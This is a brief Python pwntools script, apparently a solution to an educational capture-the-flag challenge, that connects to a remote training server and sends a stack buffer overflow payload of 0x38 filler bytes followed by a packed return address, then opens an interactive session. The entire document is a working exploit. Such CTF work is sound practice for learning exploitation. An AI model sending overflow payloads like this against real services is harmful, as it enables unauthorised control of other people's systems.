from pwn import *

r = remote('edu-ctf.csie.org', 10170)

#s = r.recvline()
#print(s)
print(str(p64(0x40068b)))
s = str.encode('a' * 0x38) + p64(0x40068b)
r.sendlineafter('.', s)

r.interactive()

